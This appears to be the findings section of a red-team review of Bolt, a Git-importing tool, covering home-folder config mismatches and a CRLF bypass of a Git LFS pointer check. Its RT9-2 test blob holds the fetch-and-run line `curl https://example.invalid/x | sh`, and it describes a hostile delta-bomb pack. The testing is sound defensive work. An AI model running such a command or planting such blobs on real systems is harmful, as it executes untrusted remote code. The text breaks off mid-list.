## Findings

- **RT9-1 Medium (a file Git's list keeps out saved, files Git tracks silently left out, and an import refused over a setting Git doesn't use; T12, T31, decisions 047, 060 and 094).**
  - **What.** `UserGit::from_env` (config.rs) finds the user's home folder in `HOME`, and when `HOME` isn't set (or is empty) asks the system: the account list's home folder on Unix (`getpwuid`), the profile folder on Windows (`FOLDERID_Profile`). Its comment says "Git's home folder is `HOME`, as Git for Windows takes it too", but Git doesn't fall back that way:
    - **On Unix** (tried on Linux; macOS runs the same code on both sides) Git takes `~` from `HOME` alone (`interpolate_path`, `xdg_config_home`). Without `HOME` it reads no `~/.gitconfig` and no `~/.config/git/config`, and has no default ignore list unless `XDG_CONFIG_HOME` is set. Bolt reads the account's `~/.gitconfig`, `~/.config/git/config` and `~/.config/git/ignore`.
    - **On Windows** `HOME` is usually not set at all. Git for Windows then makes one (`setup_windows_environment` in compat/mingw.c): `HOMEDRIVE` plus `HOMEPATH` when that is a folder, else `USERPROFILE`. Where a domain gives the account a home drive (`HOMEDRIVE=H:`, `HOMEPATH=\`), which is common in companies and universities, Git's `~/.gitconfig` is `H:\.gitconfig`, and `git config --global` writes there. Bolt reads `C:\Users\<name>\.gitconfig`.

    So Bolt applies another file's `core.excludesFile` and `lfs.storage`, or none where Git applies one. Every save then keeps out the wrong files, saying nothing: it takes in what the user's real list keeps out of Git (private keys, `.env` files), and leaves out what Git tracks, which is then in no save. And `bolt import` refuses a repository whose Git LFS objects are in `.git/lfs/objects`, over an `lfs.storage` that Git LFS isn't using, naming a file Git never reads and telling the user to remove it. This is RT8-1 and RT8-2's harm again, through the home folder instead of `GIT_CONFIG_GLOBAL`. The follow-ups' known limit covers only "no home folder at all (no `HOME`, and none the system gives)".
  - **Who is hit.** On Windows: anyone whose account has a home drive or folder apart from the profile (`HOMEDRIVE`/`HOMEPATH`) and who hasn't set `HOME` themselves; that is the default for such accounts, and their Git settings are on the home drive. On Unix: commands run with an environment that lacks `HOME` (`env -i`, some service managers, build steps and containers), where the account still has a home folder.
  - **Proof (test).**
    - `rt9_1_without_home_bolt_applies_only_the_git_settings_git_applies` (Unix, sandbox): the account's `~/.gitconfig` names a list holding `*.psd` and sets `lfs.storage = /nowhere/shared-lfs`; Git, Git LFS and Bolt run without `HOME`:
      ```
      git status without HOME: ?? art.psd ?? readme.txt
      bolt save without HOME: Saved mxlo  "First"  (1 file); saved: ["readme.txt"]
      git lfs env without HOME: Some("LocalMediaDir=/tmp/.tmp0VotXQ/.git/lfs/objects")
      bolt import without HOME: Some(1) error: Commit `3b928dbd…` holds a Git LFS file at `a.bin`, but `lfs.storage` keeps Git LFS's files outside .git/lfs/objects, where Bolt reads them: it is set to `/nowhere/shared-lfs` in /home/attacker/.gitconfig.
      hint: Nothing was changed. Remove that setting, or set it to lfs, download the files into .git/lfs/objects with `git lfs fetch --all`, then run bolt import again.
      without HOME: ["a save left out art.psd, which Git tracks", "an import stopped over an lfs.storage Git LFS doesn't use"]
      ```
    - `without_home_a_save_applies_the_ignore_list_git_for_windows_applies` (Windows CI, [run 42705153068](https://github.com/WisHonor/Bolt/actions/runs/42705153068)): no `HOME`; `HOMEDRIVE` and `HOMEPATH` name a folder whose `.gitconfig` names a list holding `*.key`; `USERPROFILE` is the runner's own:
      ```
      HOMEDRIVE+HOMEPATH = C:\Users\RUNNER~1\AppData\Local\Temp\.tmp8CtSnc; USERPROFILE = Some("C:\\Users\\runneradmin")
      git config --show-origin: file:C:/Users/RUNNER~1/AppData/Local/Temp/.tmp8CtSnc/.gitconfig	C:/Users/RUNNER~1/AppData/Local/Temp/.tmp8CtSnc/real.ignore
      git status: ?? readme.txt
      bolt save: Saved lowk  "First"  (2 files)
      saved: ["deploy.key", "readme.txt"]
      ```
      The private key Git keeps out is in Bolt's history.
    - `redteam/attacks8/config-diff.sh home-unset` shows the same four ways on Linux: `HOME` unset with the account's `~/.config/git/ignore`, or its `~/.gitconfig`, with and without `XDG_CONFIG_HOME`, and `HOME` set to nothing.
  - **Fix.** Find the home folder as Git does, in one place, and never as the system would. On Unix, `HOME` alone: without it there is no `~/.gitconfig` and no `$HOME/.config/git` (only `XDG_CONFIG_HOME`'s, if set), and a `~/` path stops the command, as Git dies on it ("failed to expand user dir"); an empty `HOME` is Git's `/.gitconfig`, which Bolt could read as Git does or refuse. The variables `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_COUNT` still apply without `HOME`, as they do in Git. On Windows without `HOME`, `HOMEDRIVE` plus `HOMEPATH` when that is a folder, else `USERPROFILE`. Needs a decision refining 047, 060 and 094, and a Windows test with the home drive apart from the profile, as here.

- **RT9-2 Low (a file brought in as something Git LFS doesn't check out, silently, past RT8-3's fix; T31, decision 094).**
  - **What.** RT8-3's fix warns about a blob over 1,024 bytes whose own first 1,024 bytes Git LFS's parser takes for a pointer (`starts_with_lfs_pointer`), and security.md T31 says that so "what reviewers saw through Git LFS and what Bolt holds can't differ silently". But on checkout Git converts a file before Git LFS's smudge filter reads it (convert.c, `convert_to_working_tree_ca_internal`: `ident`, then line endings, then the working-tree encoding, then the filter). With `eol=crlf` in `.gitattributes`, or with `core.autocrlf=true`, which Git for Windows' installer sets, on a path whose attributes lack `-text`, each LF gains a CR. The pointer's three lines gain three bytes, which push what sat in the blob's bytes 1,022 to 1,024 out of the 1,024 Git LFS reads. So a blob that is a pointer, spaces up to byte 1,023, an `X`, then anything, is no pointer to Bolt's check and comes in as its text, tail and all, with no warning; every Git LFS user who checks it out gets the pointer's file. The same conversion works the other way: a pointer of at most 1,024 bytes whose size line comes after enough blank lines is pushed past the 1,024 bytes, so Git LFS users get the pointer's text while Bolt brings in its object, again without a word.
  - **Who is hit.** Importers of a repository that holds such a blob, which only a hostile or broken history does. The attacker writes `.gitattributes` too, so `*.bin filter=lfs eol=crlf` (or `*.bin filter=lfs` for Windows users' default `core.autocrlf`) is theirs to choose. As with RT8-3, reviewers working in Git with Git LFS see one file, and Bolt's history holds another, whose tail can be a script. Nothing already in Bolt is lost.
  - **Proof (test).** `rt9_2_a_blob_git_lfs_reads_as_a_pointer_once_converted_never_comes_in_silently`: `.gitattributes` holds `*.bin filter=lfs diff=lfs merge=lfs eol=crlf`, and `a.bin` is a 1,061-byte blob: a pointer, spaces to byte 1,023, `X`, then `curl https://example.invalid/x | sh`. The evidence line is a real checkout with Git LFS 3.3.0 installed in a clone:
    ```
    a Git LFS user checks out the 1061-byte blob as "the picture everyone reviewed\n"
    bolt import: a.bin saved as 1061 bytes, the picture: false; warned: false; warnings: []
    ```
    `redteam/attacks8/crlf-checkout.sh` makes one clean clone and one checkout for each way, and shows that `core.autocrlf=true` without `eol` does the same, and the reverse case:
    ```
    x1023    eol=crlf                         blob 1061 bytes | Git LFS checkout: the picture everyone reviewed.           | bolt: version https://git-lfs.github.com/spec/ warned: False
    x1023    <none>       core.autocrlf=true  blob 1061 bytes | Git LFS checkout: the picture everyone reviewed.           | bolt: version https://git-lfs.github.com/spec/ warned: False
    sizefar  eol=crlf                         blob 1017 bytes | Git LFS checkout: version https://git-lfs.github.com/spec/ | bolt: the picture everyone reviewed.           warned: False
    sizefar  <none>       core.autocrlf=true  blob 1017 bytes | Git LFS checkout: version https://git-lfs.github.com/spec/ | bolt: the picture everyone reviewed.           warned: False
    ```
  - **Fix.** For a blob over 1,024 bytes, warn when its first 1,024 bytes *look like* a pointer (`looks_like_lfs_pointer`, the looser test decision 037 already applies to short blobs), not only when Git LFS's parser accepts them: a conversion only pushes bytes out, so the `X` blob looks like one. That is a change to `starts_with_lfs_pointer` alone, which all three read paths call, and the warning's words already fit. The reverse case belongs with the deferred row "Git LFS files judged by `.gitattributes`": until then, a pointer that the import brings in as its object could be counted in the `lfs_lookalikes` warning when its CRLF form would pass 1,024 bytes before its size line. Either needs a line in decision 094's successor and in T31's wording.

## Not proven

These are suspicions, or differences already listed as limits, without a failing test. None counts as a finding.

- **`-c` options do reach programs Git runs.** Decision 094 leaves `-c` unread because it "only reach[es] Git's own commands". Git passes them on in `GIT_CONFIG_PARAMETERS` to every program it runs: an alias such as `!bolt save`, a hook, and Git LFS. `config-diff.sh count` shows `GIT_CONFIG_PARAMETERS="'core.excludesFile'='…'"`: Git keeps `a.key` out, Bolt saves it. It is a listed limit, so not counted; the decision's reason is inexact, and reading `GIT_CONFIG_PARAMETERS` (Git's `sq_dequote` format) would close it.
- **Git LFS reads Git's settings by lines.** Git LFS 3.3.0 runs `git config --includes -l` (seen with `GIT_TRACE`), without `-z`, and splits its output at newlines. A value holding an escaped newline, such as `core.foo = "x\nlfs.storage=/elsewhere"`, gives Git LFS an `lfs.storage` that neither Git nor Bolt sees: `git lfs env` said `LocalMediaDir=/elsewhere/objects`. Only a planted setting does this, and the stop for missing files already names `git lfs env`.
- **Odd spellings of the null device stop Bolt.** `GIT_CONFIG_GLOBAL=/dev//null`, and `core.excludesFile` set to `/dev//null` or `/dev/zero`, stop a save where Git reads an empty file (`config-diff.sh`). Decision 095 names only the exact text `/dev/null`, so this is as designed: a stop, never a wrong list.
- **The first save after an import, after RT9-2's reverse case.** Where Git LFS checks out a pointer's CRLF text over 1,024 bytes, the first save's pointer look (`pointers`, which reads only files of at most 1,024 bytes) doesn't see it, so that save takes the pointer text as a change over the object the import brought in. It is RT9-2's root cause, and the object stays in the history.

## Held up

Each of these was tried in the sandbox unless marked as code reading, and Bolt behaved correctly:

- **RT8-1's fix (`lfs.storage` read where Git reads it): held, apart from the home folder (RT9-1).** `redteam8.rs`'s RT8-1 test passes. The same reader serves both settings, so the differential below covers it, and `rt9_1` shows `git lfs env` and Bolt agreeing once the home folder is the same. Decision 094's order (the user's files, then the repository's, then `GIT_CONFIG_COUNT`) is Git's (code reading, `lfs_storage_elsewhere`).
- **RT8-2's fix (the user's ignore list read where Git reads it): held, apart from the home folder (RT9-1).** `config-diff.sh` compared `git status` with `bolt status` for:
  - `GIT_CONFIG_SYSTEM` in 11 spellings: plain, `//`, `/./`, `x/..`, a trailing `/`, `/.` and `/..`, `/dev/null`, `/dev/./null`, empty, relative;
  - `GIT_CONFIG_NOSYSTEM` set to 17 values: empty, `0`, `1`, `true`, `yes`, `on`, `no`, `off`, `false`, `2`, `-1`, ` 1`, `1 `, `0x10`, `1k`, `08`, `TRUE`;
  - `GIT_CONFIG_GLOBAL` empty, `/dev/null`, a file, relative to the project, with a trailing `/`, with `./`, a literal `~/`, a folder, missing, and below a file;
  - `GIT_CONFIG_COUNT` set to empty, `1`, ` 1`, `+1`, `01`, `1 `, `-0`, `0x1`, `2` with one key, `4294967297` and `-18446744073709551615`;
  - `GIT_CONFIG_KEY_0` in 11 spellings: any case, `core..excludesFile`, `core. .excludesFile`, a trailing `.` or space, a leading `.`, `core.Excludes-File`, and subsections;
  - values `~/list`, relative, empty, and `include.path` given through a variable as `include.path`, `Include.Path` and `include..path`;
  - `core.excludesFile` quoted, with trailing spaces, `~/`, `~//`, `~`, a folder, a pipe, `/dev/null`, missing, and with `:(optional)` and `%(prefix)/` (both name a missing file on each side under Git 2.39; the follow-ups list them for Git 2.56).

  Every case kept out the same files, or both stopped (a `GIT_CONFIG_GLOBAL` or `GIT_CONFIG_SYSTEM` that names a folder included; on a pipe Git hangs and Bolt stops), apart from the odd spellings of the null device under "Not proven". No path lets a repository supply the user's settings: `.git/config` and `config.worktree` are read only for `lfs.storage`, and a repository's file is reached only through a relative path the user's own settings give, as in Git (code reading).
- **RT8-3's fix (long blobs that start with a pointer): held for the blob's own bytes; bypassed through Git's conversions (RT9-2).**
  - `lookalike-probe.py` against Git LFS 3.3.0's smudge filter on the raw blob: blobs of exactly 1,024 and 1,025 bytes, a tail after 1,024 bytes of spaces or of newlines, CRLF inside the pointer, a no-break space whole at the cut, and an ideographic space split by it. Bolt warned exactly for the five that Git LFS smudges into the object, brought the 1,024-byte one in as the object, and stayed quiet for the one Git LFS keeps as text.
  - `rt9_lookalike_paths.rs`: all three of the import's read paths warn: a 65 MiB blob streamed, a 3 MiB one read whole, and a 4 MiB one rebuilt from a delta in its family, both versions named.
  - The check reads nothing the import didn't read already: `Start` keeps at most 1,024 bytes as a streamed blob passes, and `starts_with_lfs_pointer` takes `..1024` (code reading).
- **A hostile delta family, stopped at every abort point** (`rt9_family_sweep.rs`): a 2 MiB blob stored whole, two honest members, one with two members of its own, a member listed under a name it doesn't hash to, a damaged delta, a delta on itself, and a REF_DELTA onto another pack's blob. A clean import brought in exactly the honest files. Stopped at each of its 7 abort points (`write:before-rename` three times, `pack:before-rename`, `pack:after-rename`, `commit:before-head`, `head:renamed`), then run again, it finished every time with those files, and left `.bolt/tmp` empty.
- **The work allowance against a hostile pack** (`rt9_work_bomb.rs`): a 68,730-byte pack holding a 64 KiB blob and 40 REF_DELTAs on it, each a few dozen compressed bytes that build a different file of almost 512 MiB, 20 GiB in all. - **Files at the 128 GiB cut-off** (`near-128gib.py`, release build, sparse files of zeros in `/tmp`):
